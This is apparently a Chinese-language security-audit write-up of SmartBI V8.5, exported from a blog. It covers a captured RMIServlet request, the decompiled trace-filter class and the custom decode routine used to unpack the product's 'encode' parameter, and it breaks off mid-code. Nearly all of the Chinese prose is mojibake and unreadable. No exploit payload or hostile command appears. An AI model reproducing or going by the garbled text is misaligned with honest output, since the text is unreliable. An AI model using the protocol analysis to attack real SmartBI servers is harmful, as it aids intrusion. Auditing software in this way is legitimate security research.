<h1 id="smartbiå®¡è®¡ï¼š"><a href="#smartbiå®¡è®¡ï¼š" class="headerlink" title="smartbiå®¡è®¡ï¼š"></a><strong>smartbi</strong>å®¡è®¡ï¼š</h1><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>SmartBI æ˜¯å¹¿å·æ€è¿ˆç‰¹è½¯ä»¶æœ‰é™å…¬å¸æ——ä¸‹çš„å•†ä¸šæ™ºèƒ½ BI å’Œæ•°æ®åˆ†æå“ç‰Œï¼Œæ˜¯ä¸€æ¬¾ä¼ä¸šçº§å¤§æ•°æ®åˆ†æè½¯ä»¶ï¼Œèƒ½å¿«é€ŸæŒ–æ˜ä¼ä¸šæ•°æ®ä»·å€¼ã€‚é›†åˆ<strong>æ•°æ®å¯è§†åŒ–</strong>ï¼Œ<strong>æ¢ç´¢æ€§åˆ†æ</strong>ï¼Œ<strong>è‡ªåŠ©å¼ä»ªè¡¨ç›˜</strong>ä»¥åŠ<strong>ä¸€ç«™å¼ ABI å¹³å°</strong>ï¼Œ<strong>æ™ºæ…§æ•°æ®è¿è¥å¹³å°</strong>ï¼Œ<strong>ç”µå­è¡¨æ ¼è½¯ä»¶</strong>ç­‰ç­‰</p>
<h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>ç‰ˆæœ¬ï¼šSmartBi V8.5         JDK 8</p>
<p>ä¼ å‚æ–¹å¼ï¼ˆç›´æ¥ä¼ è¾“ï¼ŒRMIServletåŠ å¯†ï¼‰</p>
<p><strong>RMIServletåŠ å¯†</strong>ã€</p>
<p>å…ˆæŠ“åŒ…ï¼ŒæŠ“åˆ°çš„getï¼Œæ”¾è¡Œä¹‹åä¼šå‡ºç°postï¼ˆsmartbiç¨‹è°ƒç”¨å…¥å£ï¼Œæ˜¯SmartBI ç”¨è‡ªå·±çš„åè®®å°è£… HTTP è¯·æ±‚ï¼ŒæŠŠè¯·æ±‚ä½“åŠ å¯†åå‘ç»™ RMIServletï¼‰</p>
<figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">POST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/smartbi/vision/RMIServlet</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP/1.1</span></span>
<span class="line"><span style="color: #61AFEF">Host:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">192.168</span><span style="color: #98C379">.1.8:18080</span></span>
<span class="line"><span style="color: #61AFEF">User-Agent:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mozilla/5.0</span><span style="color: #ABB2BF"> (Windows </span><span style="color: #98C379">NT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.0</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Win64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">x64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">rv:136.0</span><span style="color: #ABB2BF">) Gecko/20100101 Firefox/136.0</span></span>
<span class="line"><span style="color: #61AFEF">Accept:</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #98C379">/</span><span style="color: #E5C07B">*</span></span>
<span class="line"><span style="color: #61AFEF">Accept-Language:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">zh-CN,zh</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.8</span><span style="color: #98C379">,zh-TW</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.7</span><span style="color: #98C379">,zh-HK</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.5</span><span style="color: #98C379">,en-US</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.3</span><span style="color: #98C379">,en</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.2</span></span>
<span class="line"><span style="color: #61AFEF">Accept-Encoding:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">gzip,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">deflate,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">br</span></span>
<span class="line"><span style="color: #61AFEF">If-Modified-Since:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span></span>
<span class="line"><span style="color: #61AFEF">Content-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">application/x-www-form-urlencoded</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">charset</span><span style="color: #56B6C2">=</span><span style="color: #98C379">UTF-8</span></span>
<span class="line"><span style="color: #61AFEF">Content-Length:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">69</span></span>
<span class="line"><span style="color: #61AFEF">Origin:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://192.168.1.8:18080</span></span>
<span class="line"><span style="color: #61AFEF">Connection:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">keep-alive</span></span>
<span class="line"><span style="color: #61AFEF">Referer:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://192.168.1.8:18080/smartbi/vision/index.jsp</span></span>
<span class="line"><span style="color: #61AFEF">Cookie:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">JSESSIONID=FA004C807237DA15E8841C4E8D2C02BF</span></span>
<span class="line"><span style="color: #61AFEF">Priority:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">u=</span><span style="color: #D19A66">0</span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">encode</span><span style="color: #56B6C2">=</span><span style="color: #98C379">zDp4Wp4gRip+iIpiGZp4DRw6+/JV/uuu71&#39;f11fuu/u7uu/NOuu/NO1m/uu/JT</span></span></code></pre></div></div></figure>

<ol>
<li><p>è¿½è¸ªï¼ŒRMIServletåŠ å¯†çš„è§£å¯†æµç¨‹åœ¨ TraceFilter çš„ doFilter â½…æ³•</p>
<p>ï¼ˆç”¨ <strong>F12</strong> â†’ Network â†’ ç‚¹å‡»è¿™ä¸ª RMIServlet è¯·æ±‚ â†’ åœ¨ <strong>Initiator</strong> æˆ– <strong>è°ƒç”¨æ ˆ</strong> é‡Œçœ‹å“ªä¸ª JS æ–‡ä»¶ç”Ÿæˆäº† <code>encode</code>ï¼‰</p>
<p>Smartbi\Tomcat\bin\exts-smartbi\smartbiExtension4478727347500549277.tmp\META-INF\classes\smartbix\smartbi\filter\SmartbiXTraceFilter.class</p>
<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">SmartbiXTraceFilter</span><span style="color: #E06C75"> </span><span style="color: #C678DD">extends</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">TraceFilter</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> doFilter</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">ServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">request</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">ServletResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">response</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">FilterChain</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">chain</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">boolean</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">hasStartup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">FreeQueryModule</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">() </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">FreeQueryModule</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getFramework</span><span style="color: #ABB2BF">() </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">            hasStartup </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">FreeQueryModule</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getFramework</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">isServerStartupSucceed</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #ABB2BF">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (request </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> HttpServletRequest </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> response </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> HttpServletResponse </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> hasStartup) {</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">SessionLogService</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getMlogs</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">size</span><span style="color: #ABB2BF">() </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">SessionLogService</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getUlogs</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">size</span><span style="color: #ABB2BF">() </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">chain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(request, response);</span></span>
<span class="line"><span style="color: #ABB2BF">            } </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">boolean</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">need2Log</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">httpRequest</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (HttpServletRequest)request;</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">httpRequest</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setCharacterEncoding</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;UTF-8&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">HttpSession</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">httpRequest</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getSession</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (session </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">                    need2Log </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">                } </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">className</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">httpRequest</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;className&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">methodName</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">httpRequest</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;methodName&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">                    need2Log </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">checkNeedToLog</span><span style="color: #ABB2BF">(className, methodName);</span></span>
<span class="line"><span style="color: #ABB2BF">                }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #ABB2BF">need2Log) {</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">chain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(httpRequest, response);</span></span>
<span class="line"><span style="color: #ABB2BF">                } </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">RMILog</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">rmiLog</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">RMILog</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">RequestLog</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">requestLog</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">RequestLog</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">ResponseLog</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">responseLog</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ResponseLog</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">rmiLog</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setRequest</span><span style="color: #ABB2BF">(requestLog);</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">rmiLog</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setResponse</span><span style="color: #ABB2BF">(responseLog);</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">parseRequestInfo</span><span style="color: #ABB2BF">(httpRequest, requestLog);</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">TraceFilter</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">WrapperedResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">wrapResponse</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> TraceFilter.</span><span style="color: #61AFEF">WrapperedResponse</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">, (HttpServletResponse)response);</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">long</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">startTime</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">currentTimeMillis</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">chain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(httpRequest, wrapResponse);</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">long</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">duration</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">currentTimeMillis</span><span style="color: #ABB2BF">() </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> startTime;</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">requestLog</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setStart</span><span style="color: #ABB2BF">(startTime);</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">responseLog</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDuration</span><span style="color: #ABB2BF">(duration);</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">parseResponseInfo</span><span style="color: #ABB2BF">(wrapResponse, responseLog);</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">SessionLogService</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">addRMILog</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">session</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getId</span><span style="color: #ABB2BF">(), rmiLog);</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">ServletOutputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">out</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getOutputStream</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">wrapResponse</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getResponseData</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">flush</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #ABB2BF">                }</span></span>
<span class="line"><span style="color: #ABB2BF">            }</span></span>
<span class="line"><span style="color: #ABB2BF">        } </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">chain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(request, response);</span></span>
<span class="line"><span style="color: #ABB2BF">        }</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span></code></pre></div></div></figure>
</li>
<li><p>æ ¹æ®æ˜ å°„è¡¨aè¿›â¾è§£å¯†ï¼Œè§£å¯†å‡ºæ¥çš„å­—ç¬¦ä¸²æ ¹æ®  ç©ºæ ¼&#x2F;+  æ¥æ‹†åˆ†ä¸ºä¸‰ä¸ªå‚æ•°</p>
<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] </span><span style="color: #61AFEF">decode</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> data) {</span></span>
<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">char</span><span style="color: #E06C75">[] ibuf </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char</span><span style="color: #E06C75">[</span><span style="color: #D19A66">4</span><span style="color: #E06C75">]</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> ibufcount </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] obuf </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[</span><span style="color: #E5C07B">data</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">length</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">/</span><span style="color: #E06C75"> </span><span style="color: #D19A66">4</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">*</span><span style="color: #E06C75"> </span><span style="color: #D19A66">3</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> </span><span style="color: #D19A66">3</span><span style="color: #E06C75">]</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> obufcount </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">   </span></span>
<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">for</span><span style="color: #E06C75">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">data</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">length</span><span style="color: #ABB2BF">();</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">++</span><span style="color: #E06C75">i) {</span></span>
<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">char</span><span style="color: #E06C75"> ch </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">data</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">charAt</span><span style="color: #ABB2BF">(i);</span></span>
<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (ch </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #98C379">&#39;=&#39;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">||</span><span style="color: #E06C75"> ch </span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">S_DECODETABLE</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">S_DECODETABLE</span><span style="color: #E06C75">[ch] </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">127</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">            ibuf[ibufcount</span><span style="color: #ABB2BF">++</span><span style="color: #E06C75">] </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> ch</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (ibufcount </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ibuf</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">                ibufcount </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">                obufcount </span><span style="color: #56B6C2">+=</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">decode0</span><span style="color: #E06C75">(ibuf</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> obuf</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> obufcount)</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">            }</span></span>
<span class="line"><span style="color: #E06C75">        }</span></span>
<span class="line"><span style="color: #E06C75">    }</span></span>
<span class="line"><span style="color: #E06C75">   </span></span>
<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (obufcount </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">obuf</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> obuf</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">    } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span>
